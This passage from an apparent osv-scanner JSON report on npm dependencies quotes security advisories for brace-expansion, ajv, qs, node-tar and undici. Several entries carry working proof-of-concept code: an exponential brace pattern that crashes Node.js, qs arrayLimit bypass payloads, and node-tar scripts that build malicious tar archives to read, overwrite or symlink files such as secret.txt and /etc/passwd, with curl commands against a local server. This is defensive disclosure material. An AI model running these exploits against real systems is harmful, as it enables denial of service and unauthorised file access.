When an attacker provides a pattern containing repeated numeric brace ranges, the library attempts to eagerly generate every possible combination synchronously. Because the expansion grows exponentially, even a small input can consume excessive CPU and memory and may crash the Node.js process.\n\n### Details\n\nThe vulnerability occurs because `@isaacs/brace-expansion` expands brace expressions without any upper bound or complexity limit. Expansion is performed eagerly and synchronously, meaning the full result set is generated before returning control to the caller.\n\nFor example, the following input:\n\n```\n{0..99}{0..99}{0..99}{0..99}{0..99}\n```\n\nproduces:\n\n```\n100^5 = 10,000,000,000 combinations\n```\n\nThis exponential growth can quickly overwhelm the event loop and heap memory, resulting in process termination.\n\n### Proof of Concept\n\nThe following script reliably triggers the issue.\n\nCreate `poc.js`:\n\n```js\nconst { expand } = require('@isaacs/brace-expansion');\n\nconst pattern = '{0..99}{0..99}{0..99}{0..99}{0..99}';\n\nconsole.log('Starting expansion...');\nexpand(pattern);\n```\n\nRun it:\n\n```bash\nnode poc.js\n```\n\nThe process will freeze and typically crash with an error such as:\n\n```\nFATAL ERROR: JavaScript heap out of memory\n```\n\n### Impact\n\nThis is a denial of service vulnerability. Any application or downstream dependency that uses `@isaacs/brace-expansion` on untrusted input may be vulnerable to a single-request crash.\n\nAn attacker does not require authentication and can use a very small payload to:\n\n* Trigger exponential computation\n* Exhaust memory and CPU resources\n* Block the event loop\n* Crash Node.js services relying on this library","references":[{"type":"WEB","url":"https://github.com/isaacs/brace-expansion/security/advisories/GHSA-7h2j-956f-4vf2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-25547"},{"type":"PACKAGE","url":"https://github.com/isaacs/brace-expansion"}],"aliases":["CVE-2026-25547"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-02-24T12:38:54.959Z"}},{"id":"GHSA-2g4f-4pwh-qvx6@ajv-6.12.6","package":{"name":"ajv","version":"6.12.6","ecosystem":"npm","purl":"pkg:npm/ajv"},"severity":{"level":"moderate","type":"CVSS_V4","vector":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P"},"affectedVersions":{"ranges":[{"introduced":"7.0.0-alpha.0","fixed":"8.18.0"}]},"fix":{"available":true,"version":"8.18.0","requiresMajorUpdate":true},"details":{"title":"ajv has ReDoS when using `$data` option","description":"ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled.

The severity has been reduced accordingly.\n\n### Details\n\nThe `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Note on parameterLimit interaction:** The original advisory's \"DoS demonstration\" claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000.\n\n### Impact\n\nConsistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.","references":[{"type":"WEB","url":"https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-15284"},{"type":"WEB","url":"https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9"},{"type":"PACKAGE","url":"https://github.com/ljharb/qs"}],"aliases":["CVE-2025-15284"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-02-24T12:38:54.964Z"}},{"id":"GHSA-w7fw-mjwx-w883@qs-6.14.0","package":{"name":"qs","version":"6.14.0","ecosystem":"npm","purl":"pkg:npm/qs"},"severity":{"level":"low","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"},"affectedVersions":{"ranges":[{"introduced":"6.7.0","fixed":"6.14.2"}]},"fix":{"available":true,"version":"6.14.2","requiresMajorUpdate":false},"details":{"title":"qs's arrayLimit bypass in comma parsing allows denial of service","description":"### Summary\nThe `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).\n\n### Details\nWhen the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass.

Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).\n\n### PoC\n**Test 1 - Basic bypass:**\n```\nnpm install qs\n```\n\n```js\nconst qs = require('qs');\n\nconst payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)\nconst options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };\n\ntry {\n  const result = qs.parse(payload, options);\n  console.log(result.a.length);  // Outputs: 26 (bypass successful)\n} catch (e) {\n  console.log('Limit enforced:', e.message);  // Not thrown\n}\n```\n**Configuration:**\n- `comma: true`\n- `arrayLimit: 5`\n- `throwOnLimitExceeded: true`\n\nExpected: Throws \"Array limit exceeded\" error.\nActual: Parses successfully, creating an array of length 26.\n\n\n### Impact\nDenial of Service (DoS) via memory exhaustion.\n\n### Suggested Fix\nMove the `arrayLimit` check before the comma split in `parseArrayValue`, and enforce it on the resulting array length.

This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory.

This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1.

On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}...

This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---","references":[{"type":"WEB","url":"https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-23950"},{"type":"WEB","url":"https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6"},{"type":"PACKAGE","url":"https://github.com/isaacs/node-tar"}],"aliases":["CVE-2026-23950"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-02-24T12:38:54.965Z"}},{"id":"GHSA-g9mf-h72j-4rw9@undici-6.22.0","package":{"name":"undici","version":"6.22.0","ecosystem":"npm","purl":"pkg:npm/undici"},"severity":{"level":"moderate","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"},"affectedVersions":{"ranges":[{"introduced":"7.0.0","fixed":"7.18.2"}]},"fix":{"available":true,"version":"7.18.2","requiresMajorUpdate":true},"details":{"title":"Undici has an unbounded decompression chain in HTTP responses on Node.js Fetch API via Content-Encoding leads to resource exhaustion","description":"### Impact\n\nThe `fetch()` API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br).
